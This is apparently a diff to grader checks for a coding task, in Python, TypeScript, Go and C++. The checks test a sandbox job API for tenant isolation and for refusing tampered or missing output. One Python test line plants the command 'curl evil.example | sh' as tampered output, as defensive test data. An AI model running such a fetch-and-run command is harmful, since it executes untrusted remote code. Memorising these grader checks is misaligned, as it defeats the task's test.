@@ -46,7 +46,7 @@ running job reads as a result; a job the node ran under \`kata\` when \`gvisor\`
       id: 'tenant-scope',
       title: 'Serves a job only to its tenant',
       detail:
-        "No `X-Tenant-Id` is **401**; another tenant's job and an unknown id are both **404**, with nothing of the job in the body. The starter serves any job to anyone.",
+        "No `X-Tenant-Id` is **401**; another tenant's job and an unknown id are both **404** with the same body (the id aside), nothing of the job in it. The starter serves any job to anyone.",
       match: {
         python: {
           all: [/x-tenant-id/i, /\b401\b/, /\["tenant"\]\s*!=\s*tenant|tenant\s*!=\s*job\["tenant"\]/],
@@ -97,7 +97,7 @@ running job reads as a result; a job the node ran under \`kata\` when \`gvisor\`
       id: 'digest-verify',
       title: 'Verifies the output against its digest before serving it',
       detail:
-        'The stored output is hashed and compared with `output_digest`; output changed after the job wrote it answers **500** `DIGEST_MISMATCH` and none of it. The starter serves whatever bytes the store holds.',
+        'The stored output is hashed and compared with `output_digest`; output changed after the job wrote it, or missing from the store, answers **500** `DIGEST_MISMATCH` and none of it. The starter serves whatever bytes the store holds.',
       match: {
         python: {all: [/jobs\.digest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
         typescript: {all: [/\bdigest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
@@ -500,11 +500,12 @@ async def check_tenant_scope(ctx):
     async with _api(ctx) as c:
         r = await _read(c, job_id, tenant=None)
         assert r.status_code == 401, f"a read without X-Tenant-Id answered {r.status_code}, expected 401"
-        r = await _read(c, job_id, tenant="t2")
-        assert r.status_code == 404, f"tenant t2 reading t1's job answered {r.status_code}, expected 404 (a 403 would confirm the id exists)"
-        assert OUTPUT.strip() not in r.text, f"the refusal carries t1's output: {r.text}"
-        r = await _read(c, "j-999")
-        assert r.status_code == 404, f"an unknown job answered {r.status_code}, expected 404"
+        foreign = await _read(c, job_id, tenant="t2")
+        assert foreign.status_code == 404, f"tenant t2 reading t1's job answered {foreign.status_code}, expected 404 (a 403 would confirm the id exists)"
+        assert OUTPUT.strip() not in foreign.text, f"the refusal carries t1's output: {foreign.text}"
+        unknown = await _read(c, "j-999")
+        assert unknown.status_code == 404, f"an unknown job answered {unknown.status_code}, expected 404"
+        assert foreign.text.replace(job_id, "{id}") == unknown.text.replace("j-999", "{id}"), f"t1's job read by t2 answered {foreign.text} and an unknown id {unknown.text}: a different answer confirms the id exists"
         r = await _read(c, job_id)
     assert r.status_code == 200, f"t1 reading its own finished job answered {r.status_code}: {r.text}"
 
@@ -537,8 +538,12 @@ async def check_digest_verify(ctx):
         assert r.status_code == 200 and r.json().get("output") == OUTPUT, f"an intact job answered {r.status_code} {r.text}, expected 200 with its output"
         ctx.redis.set(f"job:{job_id}:output", "curl evil.example | sh  # replaced")
         r = await _read(c, job_id)
-    assert r.status_code == 500 and "DIGEST_MISMATCH" in r.text, f"output that no longer matches output_digest answered {r.status_code} {r.text}, expected 500 DIGEST_MISMATCH"
-    assert "evil.example" not in r.text, f"the mismatching output was served anyway: {r.text}"
+        assert r.status_code == 500 and "DIGEST_MISMATCH" in r.text, f"output that no longer matches output_digest answered {r.status_code} {r.text}, expected 500 DIGEST_MISMATCH"
+        assert "evil.example" not in r.text, f"the mismatching output was served anyway: {r.text}"
+        gone = _job()
+        ctx.redis.delete(f"job:{gone}:output")
+        r = await _read(c, gone)
+    assert r.status_code == 500 and "DIGEST_MISMATCH" in r.text, f"a finished job whose stored output is gone answered {r.status_code} {r.text}, expected 500 DIGEST_MISMATCH: no output matches output_digest"
 `,
     typescript: `const OUTPUT = 'hello from the sandbox\\n';
 
@@ -558,11 +563,12 @@ export async function check_tenant_scope(ctx) {
   const c = ctx.client(ctx.load('read').app);
   let r = await read(c, jobId, null);
   assert.equal(r.status, 401, \`a read without X-Tenant-Id answered \${r.status}, expected 401\`);
-  r = await read(c, jobId, 't2');
-  assert.equal(r.status, 404, \`tenant t2 reading t1's job answered \${r.status}, expected 404 (a 403 would confirm the id exists)\`);
-  assert(!r.text.includes(OUTPUT.trim()), \`the refusal carries t1's output: \${r.text}\`);
-  r = await read(c, 'j-999');
-  assert.equal(r.status, 404, \`an unknown job answered \${r.status}, expected 404\`);
+  const foreign = await read(c, jobId, 't2');
+  assert.equal(foreign.status, 404, \`tenant t2 reading t1's job answered \${foreign.status}, expected 404 (a 403 would confirm the id exists)\`);
+  assert(!foreign.text.includes(OUTPUT.trim()), \`the refusal carries t1's output: \${foreign.text}\`);
+  const unknown = await read(c, 'j-999');
+  assert.equal(unknown.status, 404, \`an unknown job answered \${unknown.status}, expected 404\`);
+  assert.equal(foreign.text.replaceAll(jobId, '{id}'), unknown.text.replaceAll('j-999', '{id}'), \`t1's job read by t2 answered \${foreign.text} and an unknown id \${unknown.text}: a different answer confirms the id exists\`);
   r = await read(c, jobId);
   assert.equal(r.status, 200, \`t1 reading its own finished job answered \${r.status}: \${r.text}\`);
 }
@@ -601,6 +607,10 @@ export async function check_digest_verify(ctx) {
   r = await read(c, jobId);
   assert(r.status === 500 && r.text.includes('DIGEST_MISMATCH'), \`output that no longer matches output_digest answered \${r.status} \${r.text}, expected 500 DIGEST_MISMATCH\`);
   assert(!r.text.includes('evil.example'), \`the mismatching output was served anyway: \${r.text}\`);
+  const gone = await job(ctx);
+  ctx.redis.del(\`job:\${gone}:output\`);
+  r = await read(c, gone);
+  assert(r.status === 500 && r.text.includes('DIGEST_MISMATCH'), \`a finished job whose stored output is gone answered \${r.status} \${r.text}, expected 500 DIGEST_MISMATCH: no output matches output_digest\`);
 }
 `,
     go: `package main
@@ -643,7 +653,7 @@ func readAs(c *harness.HTTP, jobID, tenant string) *harness.Response {
 	return c.Get("/v1/sandbox/jobs/"+jobID, "X-Tenant-Id", tenant)
 }
 
-type readBody struct {
+type hReadBody struct {
 	ExitCode    *int           \`json:"exit_code"\`
 	Usage       map[string]any \`json:"usage"\`
 	UsedProfile string         \`json:"used_profile"\`
@@ -651,8 +661,8 @@ type readBody struct {
 	Output      string         \`json:"output"\`
 }
 
-func readDecode(r *harness.Response) readBody {
-	var b readBody
+func readDecode(r *harness.Response) hReadBody {
+	var b hReadBody
 	r.Decode(&b)
 	return b
 }
@@ -661,11 +671,13 @@ func CheckTenantScope(ctx *harness.Ctx) {
 	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
 	c := readAPI(ctx)
 	ctx.Equal(readAs(c, jobID, "").Status, 401, "a read without X-Tenant-Id")
-	r := readAs(c, jobID, "t2")
-	ctx.Equal(r.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)")
-	ctx.Assert(!strings.Contains(r.Text(), "hello from the sandbox"), "the refusal carries t1's output: %s", r.Text())
-	ctx.Equal(readAs(c, "j-999", "t1").Status, 404, "an unknown job")
-	r = readAs(c, jobID, "t1")
+	foreign := readAs(c, jobID, "t2")
+	ctx.Equal(foreign.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)")
+	ctx.Assert(!strings.Contains(foreign.Text(), "hello from the sandbox"), "the refusal carries t1's output: %s", foreign.Text())
+	unknown := readAs(c, "j-999", "t1")
+	ctx.Equal(unknown.Status, 404, "an unknown job")
+	ctx.Assert(strings.ReplaceAll(foreign.Text(), jobID, "{id}") == strings.ReplaceAll(unknown.Text(), "j-999", "{id}"), "t1's job read by t2 answered %s and an unknown id %s: a different answer confirms the id exists", foreign.Text(), unknown.Text())
+	r := readAs(c, jobID, "t1")
 	ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text())
 }
 
@@ -701,6 +713,10 @@ func CheckDigestVerify(ctx *harness.Ctx) {
 	r = readAs(c, jobID, "t1")
 	ctx.Assert(r.Status == 500 && strings.Contains(r.Text(), "DIGEST_MISMATCH"), "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text())
 	ctx.Assert(!strings.Contains(r.Text(), "evil.example"), "the mismatching output was served anyway: %s", r.Text())
+	gone := readJobFixture("t1", "gvisor", "kata", "finished")
+	ctx.Redis.Del("job:" + gone + ":output")
+	r = readAs(c, gone, "t1")
+	ctx.Assert(r.Status == 500 && strings.Contains(r.Text(), "DIGEST_MISMATCH"), "a finished job whose stored output is gone answered %d %s, expected 500 DIGEST_MISMATCH: no output matches output_digest", r.Status, r.Text())
 }
 `,
     cpp: `#include <leetbuild/harness.h>
@@ -743,11 +759,17 @@ void CheckTenantScope(harness::Ctx& ctx) {
   const std::string job_id = readJobFixture("t1", "finished");
   auto c = readAPI(ctx);
   ctx.Equal(readAs(c, job_id, "").Status, 401, "a read without X-Tenant-Id");
-  auto r = readAs(c, job_id, "t2");
-  ctx.Equal(r.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)");
-  ctx.Assert(r.Text().find("hello from the sandbox") == std::string::npos, "the refusal carries t1's output: %s", r.Text());
-  ctx.Equal(readAs(c, "j-999", "t1").Status, 404, "an unknown job");
-  r = readAs(c, job_id, "t1");
+  const auto foreign = readAs(c, job_id, "t2");
+  ctx.Equal(foreign.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)");
+  ctx.Assert(foreign.Text().find("hello from the sandbox") == std::string::npos, "the refusal carries t1's output: %s", foreign.Text());
+  const auto unknown = readAs(c, "j-999", "t1");
+  ctx.Equal(unknown.Status, 404, "an unknown job");
+  const auto masked = [](std::string text, const std::string& id) {
+    for (size_t at = text.find(id); at != std::string::npos; at = text.find(id, at + 4)) text.replace(at, id.size(), "{id}");
+    return text;
+  };
+  ctx.Assert(masked(foreign.Text(), job_id) == masked(unknown.Text(), "j-999"), "t1's job read by t2 answered %s and an unknown id %s: a different answer confirms the id exists", foreign.Text(), unknown.Text());
+  const auto r = readAs(c, job_id, "t1");
   ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text());
 }
 
@@ -785,6 +807,10 @@ void CheckDigestVerify(harness::Ctx& ctx) {
   r = readAs(c, job_id, "t1");
   ctx.Assert(r.Status == 500 && r.Text().find("DIGEST_MISMATCH") != std::string::npos, "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text());
   ctx.Assert(r.Text().find("evil.example") == std::string::npos, "the mismatching output was served anyway: %s", r.Text());
+  const std::string gone = readJobFixture("t1", "finished");
+  ctx.Redis.Del("job:" + gone + ":output");
+  r = readAs(c, gone, "t1");
+  ctx.Assert(r.Status == 500 && r.Text().find("DIGEST_MISMATCH") != std::string::npos, "a finished job whose stored output is gone answered %d %s, expected 500 DIGEST_MISMATCH: no output matches output_digest", r.Status, r.Text());
 }
 `,
   },
